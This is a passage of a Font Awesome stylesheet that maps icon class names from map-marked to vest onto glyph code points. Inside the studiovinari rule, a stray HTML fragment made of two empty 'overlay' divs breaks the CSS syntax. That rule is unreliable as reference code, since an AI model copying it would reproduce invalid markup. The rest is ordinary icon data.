      .fa-map-marked:before {
          content: "\f59f";
      }
      .fa-map-marked-alt:before {
          content: "\f5a0";
      }
      .fa-map-marker:before {
          content: "\f041";
      }
      .fa-map-marker-alt:before {
          content: "\f3c5";
      }
      .fa-map-pin:before {
          content: "\f276";
      }
      .fa-map-signs:before {
          content: "\f277";
      }
      .fa-markdown:before {
          content: "\f60f";
      }
      .fa-marker:before {
          content: "\f5a1";
      }
      .fa-mars:before {
          content: "\f222";
      }
      .fa-mars-double:before {
          content: "\f227";
      }
      .fa-mars-stroke:before {
          content: "\f229";
      }
      .fa-mars-stroke-h:before {
          content: "\f22b";
      }
      .fa-mars-stroke-v:before {
          content: "\f22a";
      }
      .fa-mask:before {
          content: "\f6fa";
      }
      .fa-mastodon:before {
          content: "\f4f6";
      }
      .fa-maxcdn:before {
          content: "\f136";
      }
      .fa-mdb:before {
          content: "\f8ca";
      }
      .fa-medal:before {
          content: "\f5a2";
      }
      .fa-medapps:before {
          content: "\f3c6";
      }
      .fa-medium:before {
          content: "\f23a";
      }
      .fa-medium-m:before {
          content: "\f3c7";
      }
      .fa-medkit:before {
          content: "\f0fa";
      }
      .fa-medrt:before {
          content: "\f3c8";
      }
      .fa-meetup:before {
          content: "\f2e0";
      }
      .fa-megaport:before {
          content: "\f5a3";
      }
      .fa-meh:before {
          content: "\f11a";
      }
      .fa-meh-blank:before {
          content: "\f5a4";
      }
      .fa-meh-rolling-eyes:before {
          content: "\f5a5";
      }
      .fa-memory:before {
          content: "\f538";
      }
      .fa-mendeley:before {
          content: "\f7b3";
      }
      .fa-menorah:before {
          content: "\f676";
      }
      .fa-mercury:before {
          content: "\f223";
      }
      .fa-meteor:before {
          content: "\f753";
      }
      .fa-microblog:before {
          content: "\e01a";
      }
      .fa-microchip:before {
          content: "\f2db";
      }
      .fa-microphone:before {
          content: "\f130";
      }
      .fa-microphone-alt:before {
          content: "\f3c9";
      }
      .fa-microphone-alt-slash:before {
          content: "\f539";
      }
      .fa-microphone-slash:before {
          content: "\f131";
      }
      .fa-microscope:before {
          content: "\f610";
      }
      .fa-microsoft:before {
          content: "\f3ca";
      }
      .fa-minus:before {
          content: "\f068";
      }
      .fa-minus-circle:before {
          content: "\f056";
      }
      .fa-minus-square:before {
          content: "\f146";
      }
      .fa-mitten:before {
          content: "\f7b5";
      }
      .fa-mix:before {
          content: "\f3cb";
      }
      .fa-mixcloud:before {
          content: "\f289";
      }
      .fa-mixer:before {
          content: "\e056";
      }
      .fa-mizuni:before {
          content: "\f3cc";
      }
      .fa-mobile:before {
          content: "\f10b";
      }
      .fa-mobile-alt:before {
          content: "\f3cd";
      }
      .fa-modx:before {
          content: "\f285";
      }
      .fa-monero:before {
          content: "\f3d0";
      }
      .fa-money-bill:before {
          content: "\f0d6";
      }
      .fa-money-bill-alt:before {
          content: "\f3d1";
      }
      .fa-money-bill-wave:before {
          content: "\f53a";
      }
      .fa-money-bill-wave-alt:before {
          content: "\f53b";
      }
      .fa-money-check:before {
          content: "\f53c";
      }
      .fa-money-check-alt:before {
          content: "\f53d";
      }
      .fa-monument:before {
          content: "\f5a6";
      }
      .fa-moon:before {
          content: "\f186";
      }
      .fa-mortar-pestle:before {
          content: "\f5a7";
      }
      .fa-mosque:before {
          content: "\f678";
      }
      .fa-motorcycle:before {
          content: "\f21c";
      }
      .fa-mountain:before {
          content: "\f6fc";
      }
      .fa-mouse:before {
          content: "\f8cc";
      }
      .fa-mouse-pointer:before {
          content: "\f245";
      }
      .fa-mug-hot:before {
          content: "\f7b6";
      }
      .fa-music:before {
          content: "\f001";
      }
      .fa-napster:before {
          content: "\f3d2";
      }
      .fa-neos:before {
          content: "\f612";
      }
      .fa-network-wired:before {
          content: "\f6ff";
      }
      .fa-neuter:before {
          content: "\f22c";
      }
      .fa-newspaper:before {
          content: "\f1ea";
      }
      .fa-nimblr:before {
          content: "\f5a8";
      }
      .fa-node:before {
          content: "\f419";
      }
      .fa-node-js:before {
          content: "\f3d3";
      }
      .fa-not-equal:before {
          content: "\f53e";
      }
      .fa-notes-medical:before {
          content: "\f481";
      }
      .fa-npm:before {
          content: "\f3d4";
      }
      .fa-ns8:before {
          content: "\f3d5";
      }
      .fa-nutritionix:before {
          content: "\f3d6";
      }
      .fa-object-group:before {
          content: "\f247";
      }
      .fa-object-ungroup:before {
          content: "\f248";
      }
      .fa-octopus-deploy:before {
          content: "\e082";
      }
      .fa-odnoklassniki:before {
          content: "\f263";
      }
      .fa-odnoklassniki-square:before {
          content: "\f264";
      }
      .fa-oil-can:before {
          content: "\f613";
      }
      .fa-old-republic:before {
          content: "\f510";
      }
      .fa-om:before {
          content: "\f679";
      }
      .fa-opencart:before {
          content: "\f23d";
      }
      .fa-openid:before {
          content: "\f19b";
      }
      .fa-opera:before {
          content: "\f26a";
      }
      .fa-optin-monster:before {
          content: "\f23c";
      }
      .fa-orcid:before {
          content: "\f8d2";
      }
      .fa-osi:before {
          content: "\f41a";
      }
      .fa-otter:before {
          content: "\f700";
      }
      .fa-outdent:before {
          content: "\f03b";
      }
      .fa-page4:before {
          content: "\f3d7";
      }
      .fa-pagelines:before {
          content: "\f18c";
      }
      .fa-pager:before {
          content: "\f815";
      }
      .fa-paint-brush:before {
          content: "\f1fc";
      }
      .fa-paint-roller:before {
          content: "\f5aa";
      }
      .fa-palette:before {
          content: "\f53f";
      }
      .fa-palfed:before {
          content: "\f3d8";
      }
      .fa-pallet:before {
          content: "\f482";
      }
      .fa-paper-plane:before {
          content: "\f1d8";
      }
      .fa-paperclip:before {
          content: "\f0c6";
      }
      .fa-parachute-box:before {
          content: "\f4cd";
      }
      .fa-paragraph:before {
          content: "\f1dd";
      }
      .fa-parking:before {
          content: "\f540";
      }
      .fa-passport:before {
          content: "\f5ab";
      }
      .fa-pastafarianism:before {
          content: "\f67b";
      }
      .fa-paste:before {
          content: "\f0ea";
      }
      .fa-patreon:before {
          content: "\f3d9";
      }
      .fa-pause:before {
          content: "\f04c";
      }
      .fa-pause-circle:before {
          content: "\f28b";
      }
      .fa-paw:before {
          content: "\f1b0";
      }
      .fa-paypal:before {
          content: "\f1ed";
      }
      .fa-peace:before {
          content: "\f67c";
      }
      .fa-pen:before {
          content: "\f304";
      }
      .fa-pen-alt:before {
          content: "\f305";
      }
      .fa-pen-fancy:before {
          content: "\f5ac";
      }
      .fa-pen-nib:before {
          content: "\f5ad";
      }
      .fa-pen-square:before {
          content: "\f14b";
      }
      .fa-pencil-alt:before {
          content: "\f303";
      }
      .fa-pencil-ruler:before {
          content: "\f5ae";
      }
      .fa-penny-arcade:before {
          content: "\f704";
      }
      .fa-people-arrows:before {
          content: "\e068";
      }
      .fa-people-carry:before {
          content: "\f4ce";
      }
      .fa-pepper-hot:before {
          content: "\f816";
      }
      .fa-perbyte:before {
          content: "\e083";
      }
      .fa-percent:before {
          content: "\f295";
      }
      .fa-percentage:before {
          content: "\f541";
      }
      .fa-periscope:before {
          content: "\f3da";
      }
      .fa-person-booth:before {
          content: "\f756";
      }
      .fa-phabricator:before {
          content: "\f3db";
      }
      .fa-phoenix-framework:before {
          content: "\f3dc";
      }
      .fa-phoenix-squadron:before {
          content: "\f511";
      }
      .fa-phone:before {
          content: "\f095";
      }
      .fa-phone-alt:before {
          content: "\f879";
      }
      .fa-phone-slash:before {
          content: "\f3dd";
      }
      .fa-phone-square:before {
          content: "\f098";
      }
      .fa-phone-square-alt:before {
          content: "\f87b";
      }
      .fa-phone-volume:before {
          content: "\f2a0";
      }
      .fa-photo-video:before {
          content: "\f87c";
      }
      .fa-php:before {
          content: "\f457";
      }
      .fa-pied-piper:before {
          content: "\f2ae";
      }
      .fa-pied-piper-alt:before {
          content: "\f1a8";
      }
      .fa-pied-piper-hat:before {
          content: "\f4e5";
      }
      .fa-pied-piper-pp:before {
          content: "\f1a7";
      }
      .fa-pied-piper-square:before {
          content: "\e01e";
      }
      .fa-piggy-bank:before {
          content: "\f4d3";
      }
      .fa-pills:before {
          content: "\f484";
      }
      .fa-pinterest:before {
          content: "\f0d2";
      }
      .fa-pinterest-p:before {
          content: "\f231";
      }
      .fa-pinterest-square:before {
          content: "\f0d3";
      }
      .fa-pizza-slice:before {
          content: "\f818";
      }
      .fa-place-of-worship:before {
          content: "\f67f";
      }
      .fa-plane:before {
          content: "\f072";
      }
      .fa-plane-arrival:before {
          content: "\f5af";
      }
      .fa-plane-departure:before {
          content: "\f5b0";
      }
      .fa-plane-slash:before {
          content: "\e069";
      }
      .fa-play:before {
          content: "\f04b";
      }
      .fa-play-circle:before {
          content: "\f144";
      }
      .fa-playstation:before {
          content: "\f3df";
      }
      .fa-plug:before {
          content: "\f1e6";
      }
      .fa-plus:before {
          content: "\f067";
      }
      .fa-plus-circle:before {
          content: "\f055";
      }
      .fa-plus-square:before {
          content: "\f0fe";
      }
      .fa-podcast:before {
          content: "\f2ce";
      }
      .fa-poll:before {
          content: "\f681";
      }
      .fa-poll-h:before {
          content: "\f682";
      }
      .fa-poo:before {
          content: "\f2fe";
      }
      .fa-poo-storm:before {
          content: "\f75a";
      }
      .fa-poop:before {
          content: "\f619";
      }
      .fa-portrait:before {
          content: "\f3e0";
      }
      .fa-pound-sign:before {
          content: "\f154";
      }
      .fa-power-off:before {
          content: "\f011";
      }
      .fa-pray:before {
          content: "\f683";
      }
      .fa-praying-hands:before {
          content: "\f684";
      }
      .fa-prescription:before {
          content: "\f5b1";
      }
      .fa-prescription-bottle:before {
          content: "\f485";
      }
      .fa-prescription-bottle-alt:before {
          content: "\f486";
      }
      .fa-print:before {
          content: "\f02f";
      }
      .fa-procedures:before {
          content: "\f487";
      }
      .fa-product-hunt:before {
          content: "\f288";
      }
      .fa-project-diagram:before {
          content: "\f542";
      }
      .fa-pump-medical:before {
          content: "\e06a";
      }
      .fa-pump-soap:before {
          content: "\e06b";
      }
      .fa-pushed:before {
          content: "\f3e1";
      }
      .fa-puzzle-piece:before {
          content: "\f12e";
      }
      .fa-python:before {
          content: "\f3e2";
      }
      .fa-qq:before {
          content: "\f1d6";
      }
      .fa-qrcode:before {
          content: "\f029";
      }
      .fa-question:before {
          content: "\f128";
      }
      .fa-question-circle:before {
          content: "\f059";
      }
      .fa-quidditch:before {
          content: "\f458";
      }
      .fa-quinscape:before {
          content: "\f459";
      }
      .fa-quora:before {
          content: "\f2c4";
      }
      .fa-quote-left:before {
          content: "\f10d";
      }
      .fa-quote-right:before {
          content: "\f10e";
      }
      .fa-quran:before {
          content: "\f687";
      }
      .fa-r-project:before {
          content: "\f4f7";
      }
      .fa-radiation:before {
          content: "\f7b9";
      }
      .fa-radiation-alt:before {
          content: "\f7ba";
      }
      .fa-rainbow:before {
          content: "\f75b";
      }
      .fa-random:before {
          content: "\f074";
      }
      .fa-raspberry-pi:before {
          content: "\f7bb";
      }
      .fa-ravelry:before {
          content: "\f2d9";
      }
      .fa-react:before {
          content: "\f41b";
      }
      .fa-reacteurope:before {
          content: "\f75d";
      }
      .fa-readme:before {
          content: "\f4d5";
      }
      .fa-rebel:before {
          content: "\f1d0";
      }
      .fa-receipt:before {
          content: "\f543";
      }
      .fa-record-vinyl:before {
          content: "\f8d9";
      }
      .fa-recycle:before {
          content: "\f1b8";
      }
      .fa-red-river:before {
          content: "\f3e3";
      }
      .fa-reddit:before {
          content: "\f1a1";
      }
      .fa-reddit-alien:before {
          content: "\f281";
      }
      .fa-reddit-square:before {
          content: "\f1a2";
      }
      .fa-redhat:before {
          content: "\f7bc";
      }
      .fa-redo:before {
          content: "\f01e";
      }
      .fa-redo-alt:before {
          content: "\f2f9";
      }
      .fa-registered:before {
          content: "\f25d";
      }
      .fa-remove-format:before {
          content: "\f87d";
      }
      .fa-renren:before {
          content: "\f18b";
      }
      .fa-reply:before {
          content: "\f3e5";
      }
      .fa-reply-all:before {
          content: "\f122";
      }
      .fa-replyd:before {
          content: "\f3e6";
      }
      .fa-republican:before {
          content: "\f75e";
      }
      .fa-researchgate:before {
          content: "\f4f8";
      }
      .fa-resolving:before {
          content: "\f3e7";
      }
      .fa-restroom:before {
          content: "\f7bd";
      }
      .fa-retweet:before {
          content: "\f079";
      }
      .fa-rev:before {
          content: "\f5b2";
      }
      .fa-ribbon:before {
          content: "\f4d6";
      }
      .fa-ring:before {
          content: "\f70b";
      }
      .fa-road:before {
          content: "\f018";
      }
      .fa-robot:before {
          content: "\f544";
      }
      .fa-rocket:before {
          content: "\f135";
      }
      .fa-rocketchat:before {
          content: "\f3e8";
      }
      .fa-rockrms:before {
          content: "\f3e9";
      }
      .fa-route:before {
          content: "\f4d7";
      }
      .fa-rss:before {
          content: "\f09e";
      }
      .fa-rss-square:before {
          content: "\f143";
      }
      .fa-ruble-sign:before {
          content: "\f158";
      }
      .fa-ruler:before {
          content: "\f545";
      }
      .fa-ruler-combined:before {
          content: "\f546";
      }
      .fa-ruler-horizontal:before {
          content: "\f547";
      }
      .fa-ruler-vertical:before {
          content: "\f548";
      }
      .fa-running:before {
          content: "\f70c";
      }
      .fa-rupee-sign:before {
          content: "\f156";
      }
      .fa-rust:before {
          content: "\e07a";
      }
      .fa-sad-cry:before {
          content: "\f5b3";
      }
      .fa-sad-tear:before {
          content: "\f5b4";
      }
      .fa-safari:before {
          content: "\f267";
      }
      .fa-salesforce:before {
          content: "\f83b";
      }
      .fa-sass:before {
          content: "\f41e";
      }
      .fa-satellite:before {
          content: "\f7bf";
      }
      .fa-satellite-dish:before {
          content: "\f7c0";
      }
      .fa-save:before {
          content: "\f0c7";
      }
      .fa-schlix:before {
          content: "\f3ea";
      }
      .fa-school:before {
          content: "\f549";
      }
      .fa-screwdriver:before {
          content: "\f54a";
      }
      .fa-scribd:before {
          content: "\f28a";
      }
      .fa-scroll:before {
          content: "\f70e";
      }
      .fa-sd-card:before {
          content: "\f7c2";
      }
      .fa-search:before {
          content: "\f002";
      }
      .fa-search-dollar:before {
          content: "\f688";
      }
      .fa-search-location:before {
          content: "\f689";
      }
      .fa-search-minus:before {
          content: "\f010";
      }
      .fa-search-plus:before {
          content: "\f00e";
      }
      .fa-searchengin:before {
          content: "\f3eb";
      }
      .fa-seedling:before {
          content: "\f4d8";
      }
      .fa-sellcast:before {
          content: "\f2da";
      }
      .fa-sellsy:before {
          content: "\f213";
      }
      .fa-server:before {
          content: "\f233";
      }
      .fa-servicestack:before {
          content: "\f3ec";
      }
      .fa-shapes:before {
          content: "\f61f";
      }
      .fa-share:before {
          content: "\f064";
      }
      .fa-share-alt:before {
          content: "\f1e0";
      }
      .fa-share-alt-square:before {
          content: "\f1e1";
      }
      .fa-share-square:before {
          content: "\f14d";
      }
      .fa-shekel-sign:before {
          content: "\f20b";
      }
      .fa-shield-alt:before {
          content: "\f3ed";
      }
      .fa-shield-virus:before {
          content: "\e06c";
      }
      .fa-ship:before {
          content: "\f21a";
      }
      .fa-shipping-fast:before {
          content: "\f48b";
      }
      .fa-shirtsinbulk:before {
          content: "\f214";
      }
      .fa-shoe-prints:before {
          content: "\f54b";
      }
      .fa-shopify:before {
          content: "\e057";
      }
      .fa-shopping-bag:before {
          content: "\f290";
      }
      .fa-shopping-basket:before {
          content: "\f291";
      }
      .fa-shopping-cart:before {
          content: "\f07a";
      }
      .fa-shopware:before {
          content: "\f5b5";
      }
      .fa-shower:before {
          content: "\f2cc";
      }
      .fa-shuttle-van:before {
          content: "\f5b6";
      }
      .fa-sign:before {
          content: "\f4d9";
      }
      .fa-sign-in-alt:before {
          content: "\f2f6";
      }
      .fa-sign-language:before {
          content: "\f2a7";
      }
      .fa-sign-out-alt:before {
          content: "\f2f5";
      }
      .fa-signal:before {
          content: "\f012";
      }
      .fa-signature:before {
          content: "\f5b7";
      }
      .fa-sim-card:before {
          content: "\f7c4";
      }
      .fa-simplybuilt:before {
          content: "\f215";
      }
      .fa-sink:before {
          content: "\e06d";
      }
      .fa-sistrix:before {
          content: "\f3ee";
      }
      .fa-sitemap:before {
          content: "\f0e8";
      }
      .fa-sith:before {
          content: "\f512";
      }
      .fa-skating:before {
          content: "\f7c5";
      }
      .fa-sketch:before {
          content: "\f7c6";
      }
      .fa-skiing:before {
          content: "\f7c9";
      }
      .fa-skiing-nordic:before {
          content: "\f7ca";
      }
      .fa-skull:before {
          content: "\f54c";
      }
      .fa-skull-crossbones:before {
          content: "\f714";
      }
      .fa-skyatlas:before {
          content: "\f216";
      }
      .fa-skype:before {
          content: "\f17e";
      }
      .fa-slack:before {
          content: "\f198";
      }
      .fa-slack-hash:before {
          content: "\f3ef";
      }
      .fa-slash:before {
          content: "\f715";
      }
      .fa-sleigh:before {
          content: "\f7cc";
      }
      .fa-sliders-h:before {
          content: "\f1de";
      }
      .fa-slideshare:before {
          content: "\f1e7";
      }
      .fa-smile:before {
          content: "\f118";
      }
      .fa-smile-beam:before {
          content: "\f5b8";
      }
      .fa-smile-wink:before {
          content: "\f4da";
      }
      .fa-smog:before {
          content: "\f75f";
      }
      .fa-smoking:before {
          content: "\f48d";
      }
      .fa-smoking-ban:before {
          content: "\f54d";
      }
      .fa-sms:before {
          content: "\f7cd";
      }
      .fa-snapchat:before {
          content: "\f2ab";
      }
      .fa-snapchat-ghost:before {
          content: "\f2ac";
      }
      .fa-snapchat-square:before {
          content: "\f2ad";
      }
      .fa-snowboarding:before {
          content: "\f7ce";
      }
      .fa-snowflake:before {
          content: "\f2dc";
      }
      .fa-snowman:before {
          content: "\f7d0";
      }
      .fa-snowplow:before {
          content: "\f7d2";
      }
      .fa-soap:before {
          content: "\e06e";
      }
      .fa-socks:before {
          content: "\f696";
      }
      .fa-solar-panel:before {
          content: "\f5ba";
      }
      .fa-sort:before {
          content: "\f0dc";
      }
      .fa-sort-alpha-down:before {
          content: "\f15d";
      }
      .fa-sort-alpha-down-alt:before {
          content: "\f881";
      }
      .fa-sort-alpha-up:before {
          content: "\f15e";
      }
      .fa-sort-alpha-up-alt:before {
          content: "\f882";
      }
      .fa-sort-amount-down:before {
          content: "\f160";
      }
      .fa-sort-amount-down-alt:before {
          content: "\f884";
      }
      .fa-sort-amount-up:before {
          content: "\f161";
      }
      .fa-sort-amount-up-alt:before {
          content: "\f885";
      }
      .fa-sort-down:before {
          content: "\f0dd";
      }
      .fa-sort-numeric-down:before {
          content: "\f162";
      }
      .fa-sort-numeric-down-alt:before {
          content: "\f886";
      }
      .fa-sort-numeric-up:before {
          content: "\f163";
      }
      .fa-sort-numeric-up-alt:before {
          content: "\f887";
      }
      .fa-sort-up:before {
          content: "\f0de";
      }
      .fa-soundcloud:before {
          content: "\f1be";
      }
      .fa-sourcetree:before {
          content: "\f7d3";
      }
      .fa-spa:before {
          content: "\f5bb";
      }
      .fa-space-shuttle:before {
          content: "\f197";
      }
      .fa-speakap:before {
          content: "\f3f3";
      }
      .fa-speaker-deck:before {
          content: "\f83c";
      }
      .fa-spell-check:before {
          content: "\f891";
      }
      .fa-spider:before {
          content: "\f717";
      }
      .fa-spinner:before {
          content: "\f110";
      }
      .fa-splotch:before {
          content: "\f5bc";
      }
      .fa-spotify:before {
          content: "\f1bc";
      }
      .fa-spray-can:before {
          content: "\f5bd";
      }
      .fa-square:before {
          content: "\f0c8";
      }
      .fa-square-full:before {
          content: "\f45c";
      }
      .fa-square-root-alt:before {
          content: "\f698";
      }
      .fa-squarespace:before {
          content: "\f5be";
      }
      .fa-stack-exchange:before {
          content: "\f18d";
      }
      .fa-stack-overflow:before {
          content: "\f16c";
      }
      .fa-stackpath:before {
          content: "\f842";
      }
      .fa-stamp:before {
          content: "\f5bf";
      }
      .fa-star:before {
          content: "\f005";
      }
      .fa-star-and-crescent:before {
          content: "\f699";
      }
      .fa-star-half:before {
          content: "\f089";
      }
      .fa-star-half-alt:before {
          content: "\f5c0";
      }
      .fa-star-of-david:before {
          content: "\f69a";
      }
      .fa-star-of-life:before {
          content: "\f621";
      }
      .fa-staylinked:before {
          content: "\f3f5";
      }
      .fa-steam:before {
          content: "\f1b6";
      }
      .fa-steam-square:before {
          content: "\f1b7";
      }
      .fa-steam-symbol:before {
          content: "\f3f6";
      }
      .fa-step-backward:before {
          content: "\f048";
      }
      .fa-step-forward:before {
          content: "\f051";
      }
      .fa-stethoscope:before {
          content: "\f0f1";
      }
      .fa-sticker-mule:before {
          content: "\f3f7";
      }
      .fa-sticky-note:before {
          content: "\f249";
      }
      .fa-stop:before {
          content: "\f04d";
      }
      .fa-stop-circle:before {
          content: "\f28d";
      }
      .fa-stopwatch:before {
          content: "\f2f2";
      }
      .fa-stopwatch-20:before {
          content: "\e06f";
      }
      .fa-store:before {
          content: "\f54e";
      }
      .fa-store-alt:before {
          content: "\f54f";
      }
      .fa-store-alt-slash:before {
          content: "\e070";
      }
      .fa-store-slash:before {
          content: "\e071";
      }
      .fa-strava:before {
          content: "\f428";
      }
      .fa-stream:before {
          content: "\f550";
      }
      .fa-street-view:before {
          content: "\f21d";
      }
      .fa-strikethrough:before {
          content: "\f0cc";
      }
      .fa-stripe:before {
          content: "\f429";
      }
      .fa-stripe-s:before {
          content: "\f42a";
      }
      .fa-stroopwafel:before {
          content: "\f551";
      }
      .fa-studiovinari:before { <div class="overlay">
          <div class="overlay-content">

          </div>
          </div>
          content: "\f3f8";
      }
      .fa-stumbleupon:before {
          content: "\f1a4";
      }
      .fa-stumbleupon-circle:before {
          content: "\f1a3";
      }
      .fa-subscript:before {
          content: "\f12c";
      }
      .fa-subway:before {
          content: "\f239";
      }
      .fa-suitcase:before {
          content: "\f0f2";
      }
      .fa-suitcase-rolling:before {
          content: "\f5c1";
      }
      .fa-sun:before {
          content: "\f185";
      }
      .fa-superpowers:before {
          content: "\f2dd";
      }
      .fa-superscript:before {
          content: "\f12b";
      }
      .fa-supple:before {
          content: "\f3f9";
      }
      .fa-surprise:before {
          content: "\f5c2";
      }
      .fa-suse:before {
          content: "\f7d6";
      }
      .fa-swatchbook:before {
          content: "\f5c3";
      }
      .fa-swift:before {
          content: "\f8e1";
      }
      .fa-swimmer:before {
          content: "\f5c4";
      }
      .fa-swimming-pool:before {
          content: "\f5c5";
      }
      .fa-symfony:before {
          content: "\f83d";
      }
      .fa-synagogue:before {
          content: "\f69b";
      }
      .fa-sync:before {
          content: "\f021";
      }
      .fa-sync-alt:before {
          content: "\f2f1";
      }
      .fa-syringe:before {
          content: "\f48e";
      }
      .fa-table:before {
          content: "\f0ce";
      }
      .fa-table-tennis:before {
          content: "\f45d";
      }
      .fa-tablet:before {
          content: "\f10a";
      }
      .fa-tablet-alt:before {
          content: "\f3fa";
      }
      .fa-tablets:before {
          content: "\f490";
      }
      .fa-tachometer-alt:before {
          content: "\f3fd";
      }
      .fa-tag:before {
          content: "\f02b";
      }
      .fa-tags:before {
          content: "\f02c";
      }
      .fa-tape:before {
          content: "\f4db";
      }
      .fa-tasks:before {
          content: "\f0ae";
      }
      .fa-taxi:before {
          content: "\f1ba";
      }
      .fa-teamspeak:before {
          content: "\f4f9";
      }
      .fa-teeth:before {
          content: "\f62e";
      }
      .fa-teeth-open:before {
          content: "\f62f";
      }
      .fa-telegram:before {
          content: "\f2c6";
      }
      .fa-telegram-plane:before {
          content: "\f3fe";
      }
      .fa-temperature-high:before {
          content: "\f769";
      }
      .fa-temperature-low:before {
          content: "\f76b";
      }
      .fa-tencent-weibo:before {
          content: "\f1d5";
      }
      .fa-tenge:before {
          content: "\f7d7";
      }
      .fa-terminal:before {
          content: "\f120";
      }
      .fa-text-height:before {
          content: "\f034";
      }
      .fa-text-width:before {
          content: "\f035";
      }
      .fa-th:before {
          content: "\f00a";
      }
      .fa-th-large:before {
          content: "\f009";
      }
      .fa-th-list:before {
          content: "\f00b";
      }
      .fa-the-red-yeti:before {
          content: "\f69d";
      }
      .fa-theater-masks:before {
          content: "\f630";
      }
      .fa-themeco:before {
          content: "\f5c6";
      }
      .fa-themeisle:before {
          content: "\f2b2";
      }
      .fa-thermometer:before {
          content: "\f491";
      }
      .fa-thermometer-empty:before {
          content: "\f2cb";
      }
      .fa-thermometer-full:before {
          content: "\f2c7";
      }
      .fa-thermometer-half:before {
          content: "\f2c9";
      }
      .fa-thermometer-quarter:before {
          content: "\f2ca";
      }
      .fa-thermometer-three-quarters:before {
          content: "\f2c8";
      }
      .fa-think-peaks:before {
          content: "\f731";
      }
      .fa-thumbs-down:before {
          content: "\f165";
      }
      .fa-thumbs-up:before {
          content: "\f164";
      }
      .fa-thumbtack:before {
          content: "\f08d";
      }
      .fa-ticket-alt:before {
          content: "\f3ff";
      }
      .fa-tiktok:before {
          content: "\e07b";
      }
      .fa-times:before {
          content: "\f00d";
      }
      .fa-times-circle:before {
          content: "\f057";
      }
      .fa-tint:before {
          content: "\f043";
      }
      .fa-tint-slash:before {
          content: "\f5c7";
      }
      .fa-tired:before {
          content: "\f5c8";
      }
      .fa-toggle-off:before {
          content: "\f204";
      }
      .fa-toggle-on:before {
          content: "\f205";
      }
      .fa-toilet:before {
          content: "\f7d8";
      }
      .fa-toilet-paper:before {
          content: "\f71e";
      }
      .fa-toilet-paper-slash:before {
          content: "\e072";
      }
      .fa-toolbox:before {
          content: "\f552";
      }
      .fa-tools:before {
          content: "\f7d9";
      }
      .fa-tooth:before {
          content: "\f5c9";
      }
      .fa-torah:before {
          content: "\f6a0";
      }
      .fa-torii-gate:before {
          content: "\f6a1";
      }
      .fa-tractor:before {
          content: "\f722";
      }
      .fa-trade-federation:before {
          content: "\f513";
      }
      .fa-trademark:before {
          content: "\f25c";
      }
      .fa-traffic-light:before {
          content: "\f637";
      }
      .fa-trailer:before {
          content: "\e041";
      }
      .fa-train:before {
          content: "\f238";
      }
      .fa-tram:before {
          content: "\f7da";
      }
      .fa-transgender:before {
          content: "\f224";
      }
      .fa-transgender-alt:before {
          content: "\f225";
      }
      .fa-trash:before {
          content: "\f1f8";
      }
      .fa-trash-alt:before {
          content: "\f2ed";
      }
      .fa-trash-restore:before {
          content: "\f829";
      }
      .fa-trash-restore-alt:before {
          content: "\f82a";
      }
      .fa-tree:before {
          content: "\f1bb";
      }
      .fa-trello:before {
          content: "\f181";
      }
      .fa-trophy:before {
          content: "\f091";
      }
      .fa-truck:before {
          content: "\f0d1";
      }
      .fa-truck-loading:before {
          content: "\f4de";
      }
      .fa-truck-monster:before {
          content: "\f63b";
      }
      .fa-truck-moving:before {
          content: "\f4df";
      }
      .fa-truck-pickup:before {
          content: "\f63c";
      }
      .fa-tshirt:before {
          content: "\f553";
      }
      .fa-tty:before {
          content: "\f1e4";
      }
      .fa-tumblr:before {
          content: "\f173";
      }
      .fa-tumblr-square:before {
          content: "\f174";
      }
      .fa-tv:before {
          content: "\f26c";
      }
      .fa-twitch:before {
          content: "\f1e8";
      }
      .fa-twitter:before {
          content: "\f099";
      }
      .fa-twitter-square:before {
          content: "\f081";
      }
      .fa-typo3:before {
          content: "\f42b";
      }
      .fa-uber:before {
          content: "\f402";
      }
      .fa-ubuntu:before {
          content: "\f7df";
      }
      .fa-uikit:before {
          content: "\f403";
      }
      .fa-umbraco:before {
          content: "\f8e8";
      }
      .fa-umbrella:before {
          content: "\f0e9";
      }
      .fa-umbrella-beach:before {
          content: "\f5ca";
      }
      .fa-uncharted:before {
          content: "\e084";
      }
      .fa-underline:before {
          content: "\f0cd";
      }
      .fa-undo:before {
          content: "\f0e2";
      }
      .fa-undo-alt:before {
          content: "\f2ea";
      }
      .fa-uniregistry:before {
          content: "\f404";
      }
      .fa-unity:before {
          content: "\e049";
      }
      .fa-universal-access:before {
          content: "\f29a";
      }
      .fa-university:before {
          content: "\f19c";
      }
      .fa-unlink:before {
          content: "\f127";
      }
      .fa-unlock:before {
          content: "\f09c";
      }
      .fa-unlock-alt:before {
          content: "\f13e";
      }
      .fa-unsplash:before {
          content: "\e07c";
      }
      .fa-untappd:before {
          content: "\f405";
      }
      .fa-upload:before {
          content: "\f093";
      }
      .fa-ups:before {
          content: "\f7e0";
      }
      .fa-usb:before {
          content: "\f287";
      }
      .fa-user:before {
          content: "\f007";
      }
      .fa-user-alt:before {
          content: "\f406";
      }
      .fa-user-alt-slash:before {
          content: "\f4fa";
      }
      .fa-user-astronaut:before {
          content: "\f4fb";
      }
      .fa-user-check:before {
          content: "\f4fc";
      }
      .fa-user-circle:before {
          content: "\f2bd";
      }
      .fa-user-clock:before {
          content: "\f4fd";
      }
      .fa-user-cog:before {
          content: "\f4fe";
      }
      .fa-user-edit:before {
          content: "\f4ff";
      }
      .fa-user-friends:before {
          content: "\f500";
      }
      .fa-user-graduate:before {
          content: "\f501";
      }
      .fa-user-injured:before {
          content: "\f728";
      }
      .fa-user-lock:before {
          content: "\f502";
      }
      .fa-user-md:before {
          content: "\f0f0";
      }
      .fa-user-minus:before {
          content: "\f503";
      }
      .fa-user-ninja:before {
          content: "\f504";
      }
      .fa-user-nurse:before {
          content: "\f82f";
      }
      .fa-user-plus:before {
          content: "\f234";
      }
      .fa-user-secret:before {
          content: "\f21b";
      }
      .fa-user-shield:before {
          content: "\f505";
      }
      .fa-user-slash:before {
          content: "\f506";
      }
      .fa-user-tag:before {
          content: "\f507";
      }
      .fa-user-tie:before {
          content: "\f508";
      }
      .fa-user-times:before {
          content: "\f235";
      }
      .fa-users:before {
          content: "\f0c0";
      }
      .fa-users-cog:before {
          content: "\f509";
      }
      .fa-users-slash:before {
          content: "\e073";
      }
      .fa-usps:before {
          content: "\f7e1";
      }
      .fa-ussunnah:before {
          content: "\f407";
      }
      .fa-utensil-spoon:before {
          content: "\f2e5";
      }
      .fa-utensils:before {
          content: "\f2e7";
      }
      .fa-vaadin:before {
          content: "\f408";
      }
      .fa-vector-square:before {
          content: "\f5cb";
      }
      .fa-venus:before {
          content: "\f221";
      }
      .fa-venus-double:before {
          content: "\f226";
      }
      .fa-venus-mars:before {
          content: "\f228";
      }
      .fa-vest:before {
          content: "\e085";
      }
